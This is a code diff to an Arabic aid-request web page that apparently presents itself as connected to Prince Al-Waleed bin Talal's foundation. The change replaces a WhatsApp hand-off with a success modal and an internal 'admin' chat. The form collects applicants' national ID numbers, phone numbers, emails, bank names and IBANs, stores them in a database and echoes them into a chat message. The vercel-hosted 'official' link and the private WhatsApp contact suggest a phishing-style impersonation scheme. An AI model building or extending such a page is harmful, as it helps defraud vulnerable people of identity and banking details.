@@ -355,6 +355,69 @@ button#sendBtn:disabled{
     font-size: 0.95rem;
 }
 
+[hidden]{display:none !important;}
+.request-success-overlay{
+    position:fixed;
+    inset:0;
+    z-index:10000;
+    display:grid;
+    place-items:center;
+    padding:18px;
+    background:rgba(2,22,20,.82);
+    backdrop-filter:blur(8px);
+}
+.request-success-card{
+    width:min(100%,520px);
+    padding:30px;
+    border:1px solid rgba(255,255,255,.15);
+    border-radius:22px;
+    background:#fff;
+    color:#1e293b;
+    text-align:center;
+    box-shadow:0 24px 75px rgba(0,0,0,.38);
+}
+.success-check{
+    width:72px;
+    height:72px;
+    display:grid;
+    place-items:center;
+    margin:0 auto 14px;
+    border-radius:50%;
+    color:white;
+    background:#2ecc71;
+    font-size:2rem;
+    font-weight:bold;
+}
+.request-success-card h2{margin:0 0 8px;color:#045652;}
+.request-success-card p{color:#64748b;line-height:1.8;}
+.success-transaction{
+    margin:18px 0;
+    padding:14px;
+    border:1px dashed #087973;
+    border-radius:13px;
+    color:#045652;
+    background:#edf8f6;
+}
+.success-transaction strong{display:block;font-size:1.65rem;letter-spacing:2px;}
+.success-actions{display:grid;gap:10px;}
+.success-actions a,.success-actions button{
+    min-height:49px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    border:0;
+    border-radius:12px;
+    padding:11px 15px;
+    color:white;
+    text-decoration:none;
+    font-weight:800;
+    cursor:pointer;
+}
+.success-chat-button{background:linear-gradient(135deg,#087973,#045652);}
+.success-whatsapp-button{background:#25d366;}
+.success-home-button{background:#718096;}
+
 /* --- الفوتر الملكي الفاخر --- */
 .main-footer {
     background-color: rgba(10, 17, 24, 0.98);
@@ -395,7 +458,7 @@ button#sendBtn:disabled{
 
 
     <!-- إعدادات تطبيق الويب PWA -->
-    <link rel="manifest" href="../manifest.json?v=8">
+    <link rel="manifest" href="../manifest.json?v=9">
     <link rel="icon" type="image/png" sizes="64x64" href="../icons/favicon-64.png">
     <link rel="apple-touch-icon" sizes="180x180" href="../icons/apple-touch-icon-v2.png">
     <meta name="theme-color" content="#006b35">
@@ -445,7 +508,7 @@ button#sendBtn:disabled{
             <a href="track.html"><i class="fas fa-search"></i> متابعة طلب</a>
             <a href="https://waleed-bin-talal-website.vercel.app/ar/" target="_blank"><i class="fas fa-globe"></i> موقع الأمير الوليد بن طلال</a>
             <a href="https://wa.me/966580272758" target="_blank"><i class="fab fa-whatsapp"></i> تواصل بالواتس</a>
-                <a href="https://messenger-gamma-five.vercel.app/index.html" target="_blank"><i class="fas fa-comment-dots"></i> تطبيق الواتس الخاص بالمؤسسة</a>
+                <a href="chat.html" target="_blank"><i class="fas fa-comment-dots"></i> المحادثة المباشرة مع الإدارة</a>
         </div>
     </div>
 </header>
@@ -492,7 +555,7 @@ button#sendBtn:disabled{
 <h2>نموذج طلب مساعدة</h2>
 
 <div class="note">
-💡 بعد إرسال الطلب سيظهر لك رقم معاملة مكون من 4 أرقام لمتابعة حالة طلبك.
+💡 بعد إرسال الطلب سيظهر رقم معاملتك ويمكنك بدء محادثة مباشرة مع الإدارة.
 </div>
 
 <div class="form-group">
@@ -578,12 +641,29 @@ button#sendBtn:disabled{
 </div>
 
 <button id="sendBtn">
-    <i class="fab fa-whatsapp" style="font-size:1.4rem;"></i>
-    <span id="btnText">إرسال الطلب عبر واتساب</span>
+    <i class="fas fa-paper-plane" style="font-size:1.25rem;"></i>
+    <span id="btnText">إرسال الطلب</span>
 </button>
 
 </div>
 
+</section>
+
+<section id="requestSuccessModal" class="request-success-overlay" hidden aria-labelledby="requestSuccessTitle">
+    <div class="request-success-card" role="dialog" aria-modal="true">
+        <div class="success-check">✓</div>
+        <h2 id="requestSuccessTitle">تم استلام طلبك بنجاح</h2>
+        <p>مرحباً <strong id="successApplicantName"></strong>، تم إنشاء محادثتك المباشرة مع الإدارة.</p>
+        <div class="success-transaction">
+            <span>رقم معاملتك</span>
+            <strong id="successTransactionId">—</strong>
+        </div>
+        <div class="success-actions">
+            <a class="success-chat-button" href="chat.html">💬 ابدأ المحادثة الآن</a>
+            <a id="optionalWhatsappLink" class="success-whatsapp-button" href="https://wa.me/966580272758" target="_blank" rel="noopener">◉ التواصل عبر واتساب — اختياري</a>
+            <a class="success-home-button" href="../index.html">العودة إلى الرئيسية</a>
+        </div>
+    </div>
 </section>
 
 <!-- الفوتر الموحد -->
@@ -719,7 +799,34 @@ const transactionId = Math.floor(1000 + Math.random()*9000);
 
 try{
 
-await addDoc(collection(db,"orders"),{
+const welcomeText =
+"📋 تفاصيل الطلب المقدم (#"+transactionId+"):\n"+
+"👤 المستفيد: "+name+"\n"+
+"🆔 رقم الهوية: "+(idNumber || "غير محدد")+"\n"+
+"🌍 الدولة: "+country+"\n"+
+"📞 رقم الهاتف: "+phone+"\n"+
+"✉️ البريد الإلكتروني: "+(email || "غير محدد")+"\n"+
+"🏦 اسم البنك: "+(bankName || "غير محدد")+"\n"+
+"💳 رقم الحساب/الآيبان: "+(partNumber || "غير محدد")+"\n"+
+"📂 نوع الطلب: "+type+"\n"+
+"📝 شرح الاحتياج: "+(notes || "غير محدد")+"\n\n"+
+"مرحباً بك عزيزي المستفيد، تم استلام طلبك بنجاح. يمكنك التواصل المباشر مع إدارة المؤسسة هنا لمتابعة تفاصيل وإجراءات طلبك.";
+
+const welcomeMessage = {
+id:(globalThis.crypto?.randomUUID?.() || (Date.now()+"-"+Math.random())).slice(0,80),
+senderId:"admin",
+senderName:"إدارة المؤسسة",
+text:welcomeText,
+clientTime:new Date().toISOString(),
+messageType:"text",
+replyTo:null,
+readBy:[],
+deletedFor:[],
+deletedForAll:false,
+starredBy:[]
+};
+
+const orderRef = await addDoc(collection(db,"orders"),{
 transactionId:String(transactionId),
 name:name,
 phone:phone,
@@ -732,47 +839,41 @@ type:type,
 notes:notes,
 status:"قيد المراجعة",
 approved:false,
-createdAt:serverTimestamp()
+createdAt:serverTimestamp(),
+chatEnabled:true,
+chatMessages:[welcomeMessage],
+chatLastMessage:welcomeText,
+chatLastSender:"admin",
+chatUpdatedAt:serverTimestamp(),
+chatOnline:{admin:false,client:false},
+chatTyping:{admin:false,client:false}
 });
 
-let message =
-"📌 طلب مساعدة جديد\n\n"+
-"رقم المعاملة: "+transactionId+"\n\n"+
-"الاسم: "+name+"\n"+
-"الجوال: "+phone+"\n"+
-"البريد: "+email+"\n"+
-"الدولة: "+country+"\n"+
-"نوع المساعدة: "+type+"\n"+
-"رقم الهوية: "+idNumber+"\n"+
-"رقم الحساب: "+partNumber+"\n"+
-"اسم البنك: "+bankName+"\n"+
-"التفاصيل: "+notes;
+localStorage.setItem("waleed_internal_chat_session",JSON.stringify({
+orderId:orderRef.id,
+transactionId:String(transactionId),
+phone:phone,
+name:name
+}));
 
-alert(
-"تم إرسال طلبك بنجاح ✅\n\n"+
-"رقم معاملتك: "+transactionId+
-"\n\nاحتفظ بالرقم لمتابعة الطلب."
-);
+const whatsappMessage =
+"السلام عليكم، أحتاج المساعدة بخصوص المعاملة رقم "+transactionId;
+document.getElementById("optionalWhatsappLink").href =
+"https://wa.me/"+adminPhone+"?text="+encodeURIComponent(whatsappMessage);
+document.getElementById("successApplicantName").textContent=name;
+document.getElementById("successTransactionId").textContent=transactionId;
+document.getElementById("requestSuccessModal").hidden=false;
+document.body.style.overflow="hidden";
 
-// الفحص الذكي لجهاز المستخدم لفتح الواتساب بأنسب طريقة
-const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-if (isMobile) {
-    window.location.href = "whatsapp://send?phone=" + adminPhone + "&text=" + encodeURIComponent(message);
-} else {
-    window.open("https://web.whatsapp.com/send?phone=" + adminPhone + "&text=" + encodeURIComponent(message), '_blank');
-}
-
-// إعادة الزر لوضعه بعد الإرسال
 sendBtn.disabled = false;
-btnText.innerText = "إرسال الطلب عبر واتساب";
+btnText.innerText = "إرسال الطلب";
 
 }
 catch(error){
 console.log(error);
 alert("حدث خطأ أثناء حفظ الطلب، يرجى المحاولة مرة أخرى.");
 sendBtn.disabled = false;
-btnText.innerText = "إرسال الطلب عبر واتساب";
+btnText.innerText = "إرسال الطلب";
 }
 
 };
